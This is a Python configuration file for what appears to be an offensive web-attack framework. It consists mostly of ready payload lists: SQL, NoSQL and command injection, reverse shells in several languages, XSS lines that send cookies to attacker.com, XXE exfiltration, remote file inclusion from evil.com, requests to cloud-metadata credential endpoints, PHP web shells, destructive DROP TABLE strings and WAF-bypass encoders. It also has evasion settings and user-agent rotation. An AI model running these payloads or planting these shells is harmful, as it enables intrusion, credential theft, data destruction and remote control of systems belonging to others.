#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v9.0 - ULTIMATE EDITION
Configuration Module - Termux Optimized
"""

import os
import random

class Config:
    """Main Configuration"""
    
    # Version Info
    VERSION = "9.0-ULTIMATE"
    CODENAME = "PHOENIX"
    AUTHOR = "Atomic Security"
    
    # Paths
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    REPORTS_DIR = os.path.join(BASE_DIR, "reports")
    SHELLS_DIR = os.path.join(BASE_DIR, "shells")
    WORDLISTS_DIR = os.path.join(BASE_DIR, "wordlists")
    
    # Database
    DB_URL = os.environ.get('ATOMIC_DB_URL', f'sqlite:///{BASE_DIR}/atomic_framework.db')
    
    # Threading
    MAX_THREADS = min(100, (os.cpu_count() or 4) * 10)
    TIMEOUT = 15
    REQUEST_DELAY = 0.1
    MAX_DEPTH = 5
    
    # Evasion
    EVASION_LEVELS = ['none', 'low', 'medium', 'high', 'insane', 'stealth']
    
    # User Agents
    USER_AGENTS = [
        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.0.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    ]
    
    # Proxies rotation
    PROXIES = []
    
    # Headers rotation
    HEADERS_ROTATION = [
        {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'},
        {'Accept': 'application/json, text/javascript, */*; q=0.01'},
        {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'},
        {'Accept': '*/*'},
    ]
    
    @classmethod
    def get_random_ua(cls):
        return random.choice(cls.USER_AGENTS)
    
    @classmethod
    def get_random_headers(cls):
        headers = {
            'User-Agent': cls.get_random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        }
        headers.update(random.choice(cls.HEADERS_ROTATION))
        return headers


class Payloads:
    """Advanced Payloads Database"""
    
    # SQL Injection - Advanced
    SQLI_ERROR_BASED = [
        "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
        "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1/*", "') OR '1'='1 --",
        "') OR ('1'='1 --", "' OR '1'='1' AND 1=1 --", "1' AND 1=1 --",
        "1' AND 1=2 --", "1 OR 1=1", "1' OR '1'='1", "1' AND '1'='1'",
        "1' AND '1'='2'", "' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --",
        "admin' --", "admin' #", "admin'/*", "' OR 1=1 LIMIT 1 --",
        "' OR '1'='1' LIMIT 1 --", "1 AND 1=1", "1 AND 1=2",
        "' UNION SELECT @@version --", "' UNION SELECT user() --",
        "' UNION SELECT database() --", "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
        "'; DROP TABLE users; --", "'; DELETE FROM users; --",
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "' AND 1=CONVERT(int, (SELECT DB_NAME())) --",
    ]
    
    SQLI_TIME_BASED = [
        "' OR SLEEP(5) --", "' OR SLEEP(5)#", "' OR pg_sleep(5) --",
        "' OR WAITFOR DELAY '0:0:5' --", "' OR benchmark(5000000,MD5(1)) --",
        "'; SELECT SLEEP(5) --", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' OR IF(1=1, SLEEP(5), 0) --", "' OR (SELECT COUNT(*) FROM information_schema.tables SLEEP(5)) --",
    ]
    
    SQLI_UNION_BASED = [
        "' UNION SELECT 1,2,3 --", "' UNION SELECT null,null,null --",
        "' UNION SELECT @@version,user(),database() --",
        "' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns --",
        "' UNION SELECT username,password,email FROM users --",
        "' UNION SELECT load_file('/etc/passwd'),2,3 --",
        "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
    ]
    
    # NoSQL Injection
    NOSQL_PAYLOADS = [
        '{"$gt": ""}', '{"$ne": null}', '{"$exists": true}',
        '{"$regex": ".*"}', '{"$where": "this.password.length > 0"}',
        "{'$gt': ''}", "{'$ne': None}", "{'$exists': true}",
        "admin' || '1'=='1", "admin' && '1'=='1",
        "'; return true; var dummy='", "'; return '1'=='1'; var dummy='",
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$where": "sleep(5000)"}', '{"$where": "this.sleep(5000)"}',
    ]
    
    # Command Injection - Advanced
    CMDI_PAYLOADS = [
        "; ls -la", "; cat /etc/passwd", "; id", "; whoami", "; uname -a",
        "| ls -la", "| cat /etc/passwd", "| id", "| whoami",
        "&& ls -la", "&& cat /etc/passwd", "&& id",
        "|| ls -la", "|| cat /etc/passwd",
        "`ls -la`", "`id`", "`whoami`",
        "$(ls -la)", "$(id)", "$(whoami)",
        "; ping -c 1 127.0.0.1", "| ping -c 1 127.0.0.1",
        "; sleep 5", "| sleep 5", "&& sleep 5",
        "; nc -e /bin/sh 127.0.0.1 4444", "| nc -e /bin/sh 127.0.0.1 4444",
        "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
        "; php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "; ruby -rsocket -e'f=TCPSocket.open(\"127.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "; perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    ]
    
    # XSS - Advanced
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",
        "<svg><animate onbegin=alert('XSS') attributeName=x></svg>",
        "<marquee onstart=alert('XSS')>",
        "<meter onmouseover=alert('XSS')>",
        "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
        "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",
        "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
        "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<form action=javascript:alert(1)><input type=submit>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    ]
    
    # LFI/RFI - Advanced
    LFI_PAYLOADS = [
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        r"..\..\..\windows\win.ini", r"....\\....\\....\\windows\\win.ini",
        "/etc/passwd%00", "../../../etc/passwd%00",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://input", "php://expect://ls",
        "file:///etc/passwd", "file:///C:/windows/win.ini",
        "file:///etc/hosts", "file:///proc/self/environ",
        "expect://ls", "input://", "data://text/plain,<?php phpinfo(); ?>",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "zip:///var/www/html/upload.zip%23shell.php",
        "phar:///var/www/html/upload.phar/shell.txt",
        "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/access.log",
        "../../../proc/self/environ",
        "../../../proc/self/cmdline",
    ]
    
    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "http://evil.com/shell.php",
        "https://evil.com/shell.txt",
        "ftp://evil.com/shell.php",
        "//evil.com/shell.php",
    ]
    
    # SSRF - Advanced
    SSRF_PAYLOADS = [
        "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
        "http://[::1]", "http://0177.0.0.1", "http://2130706433",
        "http://017700000001", "http://0x7f.0.0.1", "http://0x7f000001",
        "file:///etc/passwd", "dict://localhost:11211/",
        "gopher://localhost:9000/_", "ftp://anonymous@localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://instance-data/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/",
    ]
    
    # SSTI - Advanced
    SSTI_PAYLOADS = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}",
        "{{config}}", "{{self}}", "{{request}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]}}",
        "{% raw %}{{7*7}}{% endraw %}",
        "#{7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]
    
    # XXE - Advanced
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;]><data>&exfil;</data>",
    ]
    
    # Open Redirect
    OPEN_REDIRECT_PAYLOADS = [
        "http://evil.com", "//evil.com", "https://evil.com",
        "/\\evil.com", "http:evil.com", "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "//attacker.com/%2f..", r"/\/attacker.com",
        "https://attacker.com", "//attacker.com",
        "/%09/evil.com", "/%5cevil.com",
        "///evil.com", "////evil.com",
    ]
    
    # IDOR
    IDOR_SEQUENCES = list(range(1, 100))
    
    # Path Traversal
    PATH_TRAVERSAL = [
        "../", "..%2f", "%2e%2e%2f", "%252e%252e%252f",
        "..%00/", "..%0d/", "..%5c", "%2e%2e%5c",
        "..\\", "....//", "....\\", ".../",
        "..%c0%af", "..%ef%bc%8f", "%c0%ae%c0%ae/",
    ]
    
    # File Upload Bypass
    UPLOAD_BYPASS = [
        ".php", ".php3", ".php4", ".php5", ".phtml",
        ".phar", ".phps", ".pht", ".phpt",
        ".Php", ".pHp", ".PHP", ".php.", ".php%00.jpg",
        ".php%00.png", ".php%00.gif", ".php.jpg", ".php.png",
        ".php;.jpg", ".php%20", ".php%0d%0a.jpg",
        ".php%00", ".php\x00.jpg", ".php%0a",
        ".php5.jpg", ".phtml.jpg", ".phar.jpg",
    ]
    
    # Web Shells
    PHP_SHELLS = [
        "<?php system($_GET['cmd']); ?>",
        "<?php echo shell_exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php exec($_GET['cmd'], $out); print_r($out); ?>",
        "<?php eval($_REQUEST['cmd']); ?>",
        "<?php @eval($_POST['cmd']); ?>",
        '<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>',
        "<?php $sock=fsockopen('127.0.0.1',4444);exec('/bin/sh -i <&3 >&3 2>&3');?>",
        "GIF89a<?php system($_GET['cmd']); ?>",
        "<?php $c=$_GET['c'];system($c);?>",
    ]
    
    # WAF Bypass Encodings
    ENCODINGS = {
        'url_single': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
        'url_double': lambda x: ''.join(f'%25{ord(c):02x}' for c in x),
        'unicode': lambda x: ''.join(f'%u{ord(c):04x}' for c in x),
        'html_entities': lambda x: ''.join(f'&#{ord(c)};' for c in x),
        'hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
        'octal': lambda x: ''.join(f'\\{ord(c):03o}' for c in x),
        'base64': lambda x: __import__('base64').b64encode(x.encode()).decode(),
    }

    # Advanced SQLi - Boolean-based blind
    SQLI_BOOLEAN_BLIND = [
        "' AND 1=1 --", "' AND 1=2 --",
        "' AND 'a'='a", "' AND 'a'='b",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
        "' AND SUBSTRING(version(),1,1)='5' --",
        "' AND (SELECT LENGTH(database()))>0 --",
        "' AND ORD(MID((SELECT IFNULL(CAST(schema_name AS NCHAR),0x20) FROM information_schema.schemata LIMIT 0,1),1,1))>64 --",
    ]

    # Advanced SQLi - Stacked queries
    SQLI_STACKED = [
        "'; SELECT 1; --",
        "'; SELECT pg_sleep(5); --",
        "'; EXEC xp_cmdshell('whoami'); --",
        "'; DECLARE @q VARCHAR(200)=0x77686f616d69; EXEC(@q); --",
        "'; INSERT INTO users(username,password) VALUES('hacked','hacked'); --",
    ]

    # Advanced XSS - DOM-based
    XSS_DOM_PAYLOADS = [
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "'-alert(1)-'", "\\'-alert(1)//",
        "</script><script>alert(1)</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><script>alert&lpar;1&rpar;</script>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)//-->",
    ]

    # Advanced XSS - Polyglot
    XSS_POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik;alert(1)//",
        "'\"-->]]>*/</script></style></noscript></xmp></textarea><img src=x onerror=alert(1)>",
        "-->'\"\\><img src=x onerror=alert(1)>",
    ]

    # Advanced SSRF - Cloud metadata
    SSRF_CLOUD_METADATA = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/api/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.170.2/v2/credentials",
    ]

    # CRLF Injection
    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:crlfinjection=true",
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a",
        "\\r\\nX-Injected: header",
        "%E5%98%8A%E5%98%8DSet-Cookie:crlfinjection=true",
    ]

    # HTTP Parameter Pollution
    HPP_PAYLOADS = [
        "&admin=true", "&role=admin", "&debug=1",
        "&access=all", "&auth=bypass",
    ]

    # Prototype Pollution
    PROTO_POLLUTION = [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '__proto__[isAdmin]=true',
        'constructor.prototype.isAdmin=true',
    ]

    # GraphQL Injection
    GRAPHQL_PAYLOADS = [
        '{"query":"{__schema{types{name}}}"}',
        '{"query":"{__type(name:\\"User\\"){name fields{name type{name}}}}"}',
        '{"query":"query{users{id username password email}}"}',
        '{"query":"mutation{createUser(username:\\"admin\\",password:\\"admin\\",role:\\"admin\\"){id}}"}',
    ]


class Colors:
    """Terminal Colors"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    
    @classmethod
    def success(cls, text):
        return f"{cls.GREEN}[✓]{cls.RESET} {text}"
    
    @classmethod
    def error(cls, text):
        return f"{cls.RED}[✗]{cls.RESET} {text}"
    
    @classmethod
    def warning(cls, text):
        return f"{cls.YELLOW}[!]{cls.RESET} {text}"
    
    @classmethod
    def info(cls, text):
        return f"{cls.CYAN}[*]{cls.RESET} {text}"
    
    @classmethod
    def critical(cls, text):
        return f"{cls.RED}{cls.BOLD}[CRITICAL]{cls.RESET} {text}"


# MITRE ATT&CK Mapping
MITRE_CWE_MAP = {
    "SQL Injection": ("T1190", "CWE-89"),
    "NoSQL Injection": ("T1190", "CWE-943"),
    "Command Injection": ("T1059", "CWE-78"),
    "SSTI": ("T1505", "CWE-1336"),
    "XXE": ("T1190", "CWE-611"),
    "XSS": ("T1189", "CWE-79"),
    "CSRF": ("T1659", "CWE-352"),
    "Open Redirect": ("T1566", "CWE-601"),
    "LFI": ("T1083", "CWE-22"),
    "RFI": ("T1505", "CWE-98"),
    "SSRF": ("T1505", "CWE-918"),
    "IDOR": ("T1083", "CWE-639"),
    "Race Condition": ("T1496", "CWE-362"),
    "Prototype Pollution": ("T1059", "CWE-915"),
    "HTTP Request Smuggling": ("T1505", "CWE-444"),
    "GraphQL Injection": ("T1190", "CWE-89"),
    "JWT Weakness": ("T1550", "CWE-347"),
    "CORS Misconfiguration": ("T1550", "CWE-942"),
    "Cloud Metadata Exposure": ("T1552", "CWE-200"),
    "Container Escape": ("T1611", "CWE-250"),
    "File Upload": ("T1505", "CWE-434"),
    "Path Traversal": ("T1083", "CWE-22"),
    "LDAP Injection": ("T1190", "CWE-90"),
    "XPath Injection": ("T1190", "CWE-643"),
    "XML Injection": ("T1190", "CWE-91"),
    "Log Injection": ("T1565", "CWE-117"),
    "Host Header Injection": ("T1550", "CWE-346"),
    "Cache Poisoning": ("T1565", "CWE-444"),
    "Information Disclosure": ("T1592", "CWE-200"),
    "CRLF Injection": ("T1190", "CWE-93"),
    "HTTP Parameter Pollution": ("T1190", "CWE-235"),
    "Network Exploit": ("T1190", "CWE-200"),
    "Tech Exploit": ("T1190", "CWE-1104"),
    "Service Exposure": ("T1190", "CWE-284"),
    "Missing Security Header": ("T1189", "CWE-693"),
    "Version Disclosure": ("T1592", "CWE-200"),
}
